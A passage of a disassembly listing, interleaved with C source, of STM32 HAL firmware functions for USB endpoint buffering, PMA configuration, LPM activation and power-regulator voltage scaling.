 80034fa:	881b      	ldrh	r3, [r3, #0]
 80034fc:	b29b      	uxth	r3, r3
 80034fe:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003502:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8003506:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 800350a:	68fb      	ldr	r3, [r7, #12]
 800350c:	681b      	ldr	r3, [r3, #0]
 800350e:	461a      	mov	r2, r3
 8003510:	68bb      	ldr	r3, [r7, #8]
 8003512:	781b      	ldrb	r3, [r3, #0]
 8003514:	009b      	lsls	r3, r3, #2
 8003516:	441a      	add	r2, r3
 8003518:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 800351c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003520:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003524:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003528:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800352c:	b29b      	uxth	r3, r3
 800352e:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 8003530:	68bb      	ldr	r3, [r7, #8]
 8003532:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 8003536:	2b01      	cmp	r3, #1
 8003538:	f040 80ca 	bne.w	80036d0 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 800353c:	68bb      	ldr	r3, [r7, #8]
 800353e:	695a      	ldr	r2, [r3, #20]
 8003540:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003544:	441a      	add	r2, r3
 8003546:	68bb      	ldr	r3, [r7, #8]
 8003548:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 800354a:	68bb      	ldr	r3, [r7, #8]
 800354c:	69da      	ldr	r2, [r3, #28]
 800354e:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003552:	441a      	add	r2, r3
 8003554:	68bb      	ldr	r3, [r7, #8]
 8003556:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 8003558:	68bb      	ldr	r3, [r7, #8]
 800355a:	6a1a      	ldr	r2, [r3, #32]
 800355c:	68bb      	ldr	r3, [r7, #8]
 800355e:	691b      	ldr	r3, [r3, #16]
 8003560:	429a      	cmp	r2, r3
 8003562:	d30b      	bcc.n	800357c <HAL_PCD_EP_DB_Transmit+0x63e>
        {
          len = ep->maxpacket;
 8003564:	68bb      	ldr	r3, [r7, #8]
 8003566:	691b      	ldr	r3, [r3, #16]
 8003568:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 800356c:	68bb      	ldr	r3, [r7, #8]
 800356e:	6a1a      	ldr	r2, [r3, #32]
 8003570:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003574:	1ad2      	subs	r2, r2, r3
 8003576:	68bb      	ldr	r3, [r7, #8]
 8003578:	621a      	str	r2, [r3, #32]
 800357a:	e017      	b.n	80035ac <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else if (ep->xfer_len_db == 0U)
 800357c:	68bb      	ldr	r3, [r7, #8]
 800357e:	6a1b      	ldr	r3, [r3, #32]
 8003580:	2b00      	cmp	r3, #0
 8003582:	d108      	bne.n	8003596 <HAL_PCD_EP_DB_Transmit+0x658>
        {
          len = TxPctSize;
 8003584:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003588:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 800358c:	68bb      	ldr	r3, [r7, #8]
 800358e:	2200      	movs	r2, #0
 8003590:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8003594:	e00a      	b.n	80035ac <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else
        {
          len = ep->xfer_len_db;
 8003596:	68bb      	ldr	r3, [r7, #8]
 8003598:	6a1b      	ldr	r3, [r3, #32]
 800359a:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 800359e:	68bb      	ldr	r3, [r7, #8]
 80035a0:	2200      	movs	r2, #0
 80035a2:	621a      	str	r2, [r3, #32]
          ep->xfer_fill_db = 0;
 80035a4:	68bb      	ldr	r3, [r7, #8]
 80035a6:	2200      	movs	r2, #0
 80035a8:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
        }

        /* Set the Double buffer counter for pmabuffer1 */
        PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 80035ac:	68fb      	ldr	r3, [r7, #12]
 80035ae:	681b      	ldr	r3, [r3, #0]
 80035b0:	657b      	str	r3, [r7, #84]	; 0x54
 80035b2:	68bb      	ldr	r3, [r7, #8]
 80035b4:	785b      	ldrb	r3, [r3, #1]
 80035b6:	2b00      	cmp	r3, #0
 80035b8:	d165      	bne.n	8003686 <HAL_PCD_EP_DB_Transmit+0x748>
 80035ba:	68fb      	ldr	r3, [r7, #12]
 80035bc:	681b      	ldr	r3, [r3, #0]
 80035be:	65fb      	str	r3, [r7, #92]	; 0x5c
 80035c0:	68fb      	ldr	r3, [r7, #12]
 80035c2:	681b      	ldr	r3, [r3, #0]
 80035c4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80035c8:	b29b      	uxth	r3, r3
 80035ca:	461a      	mov	r2, r3
 80035cc:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80035ce:	4413      	add	r3, r2
 80035d0:	65fb      	str	r3, [r7, #92]	; 0x5c
 80035d2:	68bb      	ldr	r3, [r7, #8]
 80035d4:	781b      	ldrb	r3, [r3, #0]
 80035d6:	00da      	lsls	r2, r3, #3
 80035d8:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80035da:	4413      	add	r3, r2
 80035dc:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80035e0:	65bb      	str	r3, [r7, #88]	; 0x58
 80035e2:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035e4:	881b      	ldrh	r3, [r3, #0]
 80035e6:	b29b      	uxth	r3, r3
 80035e8:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80035ec:	b29a      	uxth	r2, r3
 80035ee:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035f0:	801a      	strh	r2, [r3, #0]
 80035f2:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035f6:	2b3e      	cmp	r3, #62	; 0x3e
 80035f8:	d91d      	bls.n	8003636 <HAL_PCD_EP_DB_Transmit+0x6f8>
 80035fa:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035fe:	095b      	lsrs	r3, r3, #5
 8003600:	66bb      	str	r3, [r7, #104]	; 0x68
 8003602:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003606:	f003 031f 	and.w	r3, r3, #31
 800360a:	2b00      	cmp	r3, #0
 800360c:	d102      	bne.n	8003614 <HAL_PCD_EP_DB_Transmit+0x6d6>
 800360e:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003610:	3b01      	subs	r3, #1
 8003612:	66bb      	str	r3, [r7, #104]	; 0x68
 8003614:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003616:	881b      	ldrh	r3, [r3, #0]
 8003618:	b29a      	uxth	r2, r3
 800361a:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800361c:	b29b      	uxth	r3, r3
 800361e:	029b      	lsls	r3, r3, #10
 8003620:	b29b      	uxth	r3, r3
 8003622:	4313      	orrs	r3, r2
 8003624:	b29b      	uxth	r3, r3
 8003626:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800362a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800362e:	b29a      	uxth	r2, r3
 8003630:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003632:	801a      	strh	r2, [r3, #0]
 8003634:	e041      	b.n	80036ba <HAL_PCD_EP_DB_Transmit+0x77c>
 8003636:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800363a:	2b00      	cmp	r3, #0
 800363c:	d10a      	bne.n	8003654 <HAL_PCD_EP_DB_Transmit+0x716>
 800363e:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003640:	881b      	ldrh	r3, [r3, #0]
 8003642:	b29b      	uxth	r3, r3
 8003644:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003648:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800364c:	b29a      	uxth	r2, r3
 800364e:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003650:	801a      	strh	r2, [r3, #0]
 8003652:	e032      	b.n	80036ba <HAL_PCD_EP_DB_Transmit+0x77c>
 8003654:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003658:	085b      	lsrs	r3, r3, #1
 800365a:	66bb      	str	r3, [r7, #104]	; 0x68
 800365c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003660:	f003 0301 	and.w	r3, r3, #1
 8003664:	2b00      	cmp	r3, #0
 8003666:	d002      	beq.n	800366e <HAL_PCD_EP_DB_Transmit+0x730>
 8003668:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800366a:	3301      	adds	r3, #1
 800366c:	66bb      	str	r3, [r7, #104]	; 0x68
 800366e:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003670:	881b      	ldrh	r3, [r3, #0]
 8003672:	b29a      	uxth	r2, r3
 8003674:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003676:	b29b      	uxth	r3, r3
 8003678:	029b      	lsls	r3, r3, #10
 800367a:	b29b      	uxth	r3, r3
 800367c:	4313      	orrs	r3, r2
 800367e:	b29a      	uxth	r2, r3
 8003680:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003682:	801a      	strh	r2, [r3, #0]
 8003684:	e019      	b.n	80036ba <HAL_PCD_EP_DB_Transmit+0x77c>
 8003686:	68bb      	ldr	r3, [r7, #8]
 8003688:	785b      	ldrb	r3, [r3, #1]
 800368a:	2b01      	cmp	r3, #1
 800368c:	d115      	bne.n	80036ba <HAL_PCD_EP_DB_Transmit+0x77c>
 800368e:	68fb      	ldr	r3, [r7, #12]
 8003690:	681b      	ldr	r3, [r3, #0]
 8003692:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003696:	b29b      	uxth	r3, r3
 8003698:	461a      	mov	r2, r3
 800369a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800369c:	4413      	add	r3, r2
 800369e:	657b      	str	r3, [r7, #84]	; 0x54
 80036a0:	68bb      	ldr	r3, [r7, #8]
 80036a2:	781b      	ldrb	r3, [r3, #0]
 80036a4:	00da      	lsls	r2, r3, #3
 80036a6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80036a8:	4413      	add	r3, r2
 80036aa:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80036ae:	653b      	str	r3, [r7, #80]	; 0x50
 80036b0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80036b4:	b29a      	uxth	r2, r3
 80036b6:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80036b8:	801a      	strh	r2, [r3, #0]

        /* Copy the user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr1, (uint16_t)len);
 80036ba:	68fb      	ldr	r3, [r7, #12]
 80036bc:	6818      	ldr	r0, [r3, #0]
 80036be:	68bb      	ldr	r3, [r7, #8]
 80036c0:	6959      	ldr	r1, [r3, #20]
 80036c2:	68bb      	ldr	r3, [r7, #8]
 80036c4:	895a      	ldrh	r2, [r3, #10]
 80036c6:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80036ca:	b29b      	uxth	r3, r3
 80036cc:	f004 fee7 	bl	800849e <USB_WritePMA>
      }
    }
  }

  /*enable endpoint IN*/
  PCD_SET_EP_TX_STATUS(hpcd->Instance, ep->num, USB_EP_TX_VALID);
 80036d0:	68fb      	ldr	r3, [r7, #12]
 80036d2:	681b      	ldr	r3, [r3, #0]
 80036d4:	461a      	mov	r2, r3
 80036d6:	68bb      	ldr	r3, [r7, #8]
 80036d8:	781b      	ldrb	r3, [r3, #0]
 80036da:	009b      	lsls	r3, r3, #2
 80036dc:	4413      	add	r3, r2
 80036de:	881b      	ldrh	r3, [r3, #0]
 80036e0:	b29b      	uxth	r3, r3
 80036e2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80036e6:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80036ea:	82bb      	strh	r3, [r7, #20]
 80036ec:	8abb      	ldrh	r3, [r7, #20]
 80036ee:	f083 0310 	eor.w	r3, r3, #16
 80036f2:	82bb      	strh	r3, [r7, #20]
 80036f4:	8abb      	ldrh	r3, [r7, #20]
 80036f6:	f083 0320 	eor.w	r3, r3, #32
 80036fa:	82bb      	strh	r3, [r7, #20]
 80036fc:	68fb      	ldr	r3, [r7, #12]
 80036fe:	681b      	ldr	r3, [r3, #0]
 8003700:	461a      	mov	r2, r3
 8003702:	68bb      	ldr	r3, [r7, #8]
 8003704:	781b      	ldrb	r3, [r3, #0]
 8003706:	009b      	lsls	r3, r3, #2
 8003708:	441a      	add	r2, r3
 800370a:	8abb      	ldrh	r3, [r7, #20]
 800370c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003710:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003714:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8003718:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800371c:	b29b      	uxth	r3, r3
 800371e:	8013      	strh	r3, [r2, #0]

  return HAL_OK;
 8003720:	2300      	movs	r3, #0
}
 8003722:	4618      	mov	r0, r3
 8003724:	3790      	adds	r7, #144	; 0x90
 8003726:	46bd      	mov	sp, r7
 8003728:	bd80      	pop	{r7, pc}

0800372a <HAL_PCDEx_PMAConfig>:
  * @retval HAL status
  */

HAL_StatusTypeDef  HAL_PCDEx_PMAConfig(PCD_HandleTypeDef *hpcd, uint16_t ep_addr,
                                       uint16_t ep_kind, uint32_t pmaadress)
{
 800372a:	b480      	push	{r7}
 800372c:	b087      	sub	sp, #28
 800372e:	af00      	add	r7, sp, #0
 8003730:	60f8      	str	r0, [r7, #12]
 8003732:	607b      	str	r3, [r7, #4]
 8003734:	460b      	mov	r3, r1
 8003736:	817b      	strh	r3, [r7, #10]
 8003738:	4613      	mov	r3, r2
 800373a:	813b      	strh	r3, [r7, #8]
  PCD_EPTypeDef *ep;

  /* initialize ep structure*/
  if ((0x80U & ep_addr) == 0x80U)
 800373c:	897b      	ldrh	r3, [r7, #10]
 800373e:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8003742:	b29b      	uxth	r3, r3
 8003744:	2b00      	cmp	r3, #0
 8003746:	d00b      	beq.n	8003760 <HAL_PCDEx_PMAConfig+0x36>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8003748:	897b      	ldrh	r3, [r7, #10]
 800374a:	f003 0307 	and.w	r3, r3, #7
 800374e:	1c5a      	adds	r2, r3, #1
 8003750:	4613      	mov	r3, r2
 8003752:	009b      	lsls	r3, r3, #2
 8003754:	4413      	add	r3, r2
 8003756:	00db      	lsls	r3, r3, #3
 8003758:	68fa      	ldr	r2, [r7, #12]
 800375a:	4413      	add	r3, r2
 800375c:	617b      	str	r3, [r7, #20]
 800375e:	e009      	b.n	8003774 <HAL_PCDEx_PMAConfig+0x4a>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 8003760:	897a      	ldrh	r2, [r7, #10]
 8003762:	4613      	mov	r3, r2
 8003764:	009b      	lsls	r3, r3, #2
 8003766:	4413      	add	r3, r2
 8003768:	00db      	lsls	r3, r3, #3
 800376a:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800376e:	68fa      	ldr	r2, [r7, #12]
 8003770:	4413      	add	r3, r2
 8003772:	617b      	str	r3, [r7, #20]
  }

  /* Here we check if the endpoint is single or double Buffer*/
  if (ep_kind == PCD_SNG_BUF)
 8003774:	893b      	ldrh	r3, [r7, #8]
 8003776:	2b00      	cmp	r3, #0
 8003778:	d107      	bne.n	800378a <HAL_PCDEx_PMAConfig+0x60>
  {
    /* Single Buffer */
    ep->doublebuffer = 0U;
 800377a:	697b      	ldr	r3, [r7, #20]
 800377c:	2200      	movs	r2, #0
 800377e:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaadress = (uint16_t)pmaadress;
 8003780:	687b      	ldr	r3, [r7, #4]
 8003782:	b29a      	uxth	r2, r3
 8003784:	697b      	ldr	r3, [r7, #20]
 8003786:	80da      	strh	r2, [r3, #6]
 8003788:	e00b      	b.n	80037a2 <HAL_PCDEx_PMAConfig+0x78>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  else /* USB_DBL_BUF */
  {
    /* Double Buffer Endpoint */
    ep->doublebuffer = 1U;
 800378a:	697b      	ldr	r3, [r7, #20]
 800378c:	2201      	movs	r2, #1
 800378e:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaaddr0 = (uint16_t)(pmaadress & 0xFFFFU);
 8003790:	687b      	ldr	r3, [r7, #4]
 8003792:	b29a      	uxth	r2, r3
 8003794:	697b      	ldr	r3, [r7, #20]
 8003796:	811a      	strh	r2, [r3, #8]
    ep->pmaaddr1 = (uint16_t)((pmaadress & 0xFFFF0000U) >> 16);
 8003798:	687b      	ldr	r3, [r7, #4]
 800379a:	0c1b      	lsrs	r3, r3, #16
 800379c:	b29a      	uxth	r2, r3
 800379e:	697b      	ldr	r3, [r7, #20]
 80037a0:	815a      	strh	r2, [r3, #10]
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 80037a2:	2300      	movs	r3, #0
}
 80037a4:	4618      	mov	r0, r3
 80037a6:	371c      	adds	r7, #28
 80037a8:	46bd      	mov	sp, r7
 80037aa:	f85d 7b04 	ldr.w	r7, [sp], #4
 80037ae:	4770      	bx	lr

080037b0 <HAL_PCDEx_ActivateLPM>:
  * @brief  Activate LPM feature.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCDEx_ActivateLPM(PCD_HandleTypeDef *hpcd)
{
 80037b0:	b480      	push	{r7}
 80037b2:	b085      	sub	sp, #20
 80037b4:	af00      	add	r7, sp, #0
 80037b6:	6078      	str	r0, [r7, #4]

  USB_TypeDef *USBx = hpcd->Instance;
 80037b8:	687b      	ldr	r3, [r7, #4]
 80037ba:	681b      	ldr	r3, [r3, #0]
 80037bc:	60fb      	str	r3, [r7, #12]
  hpcd->lpm_active = 1U;
 80037be:	687b      	ldr	r3, [r7, #4]
 80037c0:	2201      	movs	r2, #1
 80037c2:	f8c3 22ec 	str.w	r2, [r3, #748]	; 0x2ec
  hpcd->LPM_State = LPM_L0;
 80037c6:	687b      	ldr	r3, [r7, #4]
 80037c8:	2200      	movs	r2, #0
 80037ca:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0

  USBx->LPMCSR |= USB_LPMCSR_LMPEN;
 80037ce:	68fb      	ldr	r3, [r7, #12]
 80037d0:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 80037d4:	b29b      	uxth	r3, r3
 80037d6:	f043 0301 	orr.w	r3, r3, #1
 80037da:	b29a      	uxth	r2, r3
 80037dc:	68fb      	ldr	r3, [r7, #12]
 80037de:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54
  USBx->LPMCSR |= USB_LPMCSR_LPMACK;
 80037e2:	68fb      	ldr	r3, [r7, #12]
 80037e4:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 80037e8:	b29b      	uxth	r3, r3
 80037ea:	f043 0302 	orr.w	r3, r3, #2
 80037ee:	b29a      	uxth	r2, r3
 80037f0:	68fb      	ldr	r3, [r7, #12]
 80037f2:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54

  return HAL_OK;
 80037f6:	2300      	movs	r3, #0
}
 80037f8:	4618      	mov	r0, r3
 80037fa:	3714      	adds	r7, #20
 80037fc:	46bd      	mov	sp, r7
 80037fe:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003802:	4770      	bx	lr

08003804 <HAL_PWR_EnableBkUpAccess>:
  * @note  LSEON bit that switches on and off the LSE crystal belongs as well to the
  *        back-up domain.
  * @retval None
  */
void HAL_PWR_EnableBkUpAccess(void)
{
 8003804:	b480      	push	{r7}
 8003806:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8003808:	4b05      	ldr	r3, [pc, #20]	; (8003820 <HAL_PWR_EnableBkUpAccess+0x1c>)
 800380a:	681b      	ldr	r3, [r3, #0]
 800380c:	4a04      	ldr	r2, [pc, #16]	; (8003820 <HAL_PWR_EnableBkUpAccess+0x1c>)
 800380e:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003812:	6013      	str	r3, [r2, #0]
}
 8003814:	bf00      	nop
 8003816:	46bd      	mov	sp, r7
 8003818:	f85d 7b04 	ldr.w	r7, [sp], #4
 800381c:	4770      	bx	lr
 800381e:	bf00      	nop
 8003820:	40007000 	.word	0x40007000

08003824 <HAL_PWREx_GetVoltageRange>:
  * @brief Return Voltage Scaling Range.
  * @retval VOS bit field (PWR_REGULATOR_VOLTAGE_SCALE1 or PWR_REGULATOR_VOLTAGE_SCALE2
  *         or PWR_REGULATOR_VOLTAGE_SCALE1_BOOST when applicable)
  */
uint32_t HAL_PWREx_GetVoltageRange(void)
{
 8003824:	b480      	push	{r7}
 8003826:	af00      	add	r7, sp, #0
    else
    {
      return PWR_REGULATOR_VOLTAGE_SCALE1_BOOST;
    }
#else
  return  (PWR->CR1 & PWR_CR1_VOS);
 8003828:	4b04      	ldr	r3, [pc, #16]	; (800383c <HAL_PWREx_GetVoltageRange+0x18>)
 800382a:	681b      	ldr	r3, [r3, #0]
 800382c:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
#endif
}
 8003830:	4618      	mov	r0, r3
 8003832:	46bd      	mov	sp, r7
 8003834:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003838:	4770      	bx	lr
 800383a:	bf00      	nop
 800383c:	40007000 	.word	0x40007000

08003840 <HAL_PWREx_ControlVoltageScaling>:
  *        cleared before returning the status. If the flag is not cleared within
  *        50 microseconds, HAL_TIMEOUT status is reported.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_PWREx_ControlVoltageScaling(uint32_t VoltageScaling)
{
 8003840:	b480      	push	{r7}
 8003842:	b085      	sub	sp, #20
 8003844:	af00      	add	r7, sp, #0
 8003846:	6078      	str	r0, [r7, #4]
  }

#else

  /* If Set Range 1 */
  if (VoltageScaling == PWR_REGULATOR_VOLTAGE_SCALE1)
 8003848:	687b      	ldr	r3, [r7, #4]
 800384a:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 800384e:	d130      	bne.n	80038b2 <HAL_PWREx_ControlVoltageScaling+0x72>
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE1)
 8003850:	4b23      	ldr	r3, [pc, #140]	; (80038e0 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003852:	681b      	ldr	r3, [r3, #0]
 8003854:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 8003858:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 800385c:	d038      	beq.n	80038d0 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 1 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE1);
 800385e:	4b20      	ldr	r3, [pc, #128]	; (80038e0 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003860:	681b      	ldr	r3, [r3, #0]
 8003862:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 8003866:	4a1e      	ldr	r2, [pc, #120]	; (80038e0 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003868:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 800386c:	6013      	str	r3, [r2, #0]

      /* Wait until VOSF is cleared */
      wait_loop_index = ((PWR_FLAG_SETTING_DELAY_US * SystemCoreClock) / 1000000U) + 1U;
 800386e:	4b1d      	ldr	r3, [pc, #116]	; (80038e4 <HAL_PWREx_ControlVoltageScaling+0xa4>)
 8003870:	681b      	ldr	r3, [r3, #0]
 8003872:	2232      	movs	r2, #50	; 0x32
 8003874:	fb02 f303 	mul.w	r3, r2, r3
 8003878:	4a1b      	ldr	r2, [pc, #108]	; (80038e8 <HAL_PWREx_ControlVoltageScaling+0xa8>)
 800387a:	fba2 2303 	umull	r2, r3, r2, r3
 800387e:	0c9b      	lsrs	r3, r3, #18
 8003880:	3301      	adds	r3, #1
 8003882:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003884:	e002      	b.n	800388c <HAL_PWREx_ControlVoltageScaling+0x4c>
      {
        wait_loop_index--;
 8003886:	68fb      	ldr	r3, [r7, #12]
 8003888:	3b01      	subs	r3, #1
 800388a:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 800388c:	4b14      	ldr	r3, [pc, #80]	; (80038e0 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 800388e:	695b      	ldr	r3, [r3, #20]
 8003890:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003894:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003898:	d102      	bne.n	80038a0 <HAL_PWREx_ControlVoltageScaling+0x60>
 800389a:	68fb      	ldr	r3, [r7, #12]
 800389c:	2b00      	cmp	r3, #0
 800389e:	d1f2      	bne.n	8003886 <HAL_PWREx_ControlVoltageScaling+0x46>
      }
      if (HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF))
 80038a0:	4b0f      	ldr	r3, [pc, #60]	; (80038e0 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80038a2:	695b      	ldr	r3, [r3, #20]
 80038a4:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80038a8:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 80038ac:	d110      	bne.n	80038d0 <HAL_PWREx_ControlVoltageScaling+0x90>
      {
        return HAL_TIMEOUT;
 80038ae:	2303      	movs	r3, #3
 80038b0:	e00f      	b.n	80038d2 <HAL_PWREx_ControlVoltageScaling+0x92>
      }
    }
  }
  else
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE2)
 80038b2:	4b0b      	ldr	r3, [pc, #44]	; (80038e0 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80038b4:	681b      	ldr	r3, [r3, #0]
 80038b6:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 80038ba:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 80038be:	d007      	beq.n	80038d0 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 2 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE2);
 80038c0:	4b07      	ldr	r3, [pc, #28]	; (80038e0 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80038c2:	681b      	ldr	r3, [r3, #0]
 80038c4:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 80038c8:	4a05      	ldr	r2, [pc, #20]	; (80038e0 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80038ca:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 80038ce:	6013      	str	r3, [r2, #0]
      /* No need to wait for VOSF to be cleared for this transition */
    }
  }
#endif

  return HAL_OK;
 80038d0:	2300      	movs	r3, #0
}
 80038d2:	4618      	mov	r0, r3
 80038d4:	3714      	adds	r7, #20
 80038d6:	46bd      	mov	sp, r7
 80038d8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80038dc:	4770      	bx	lr
 80038de:	bf00      	nop
 80038e0:	40007000 	.word	0x40007000
 80038e4:	20000000 	.word	0x20000000
 80038e8:	431bde83 	.word	0x431bde83

080038ec <HAL_PWREx_EnableVddUSB>:
  * @brief Enable VDDUSB supply.
  * @note  Remove VDDUSB electrical and logical isolation, once VDDUSB supply is present.
  * @retval None
  */
void HAL_PWREx_EnableVddUSB(void)
{
 80038ec:	b480      	push	{r7}
 80038ee:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR2, PWR_CR2_USV);
 80038f0:	4b05      	ldr	r3, [pc, #20]	; (8003908 <HAL_PWREx_EnableVddUSB+0x1c>)
 80038f2:	685b      	ldr	r3, [r3, #4]
 80038f4:	4a04      	ldr	r2, [pc, #16]	; (8003908 <HAL_PWREx_EnableVddUSB+0x1c>)
 80038f6:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 80038fa:	6053      	str	r3, [r2, #4]
}
 80038fc:	bf00      	nop
 80038fe:	46bd      	mov	sp, r7
 8003900:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003904:	4770      	bx	lr
 8003906:	bf00      	nop
 8003908:	40007000 	.word	0x40007000

0800390c <HAL_RCC_OscConfig>:
  * @note   If HSE failed to start, HSE should be disabled before recalling
            HAL_RCC_OscConfig().
  * @retval HAL status
  */
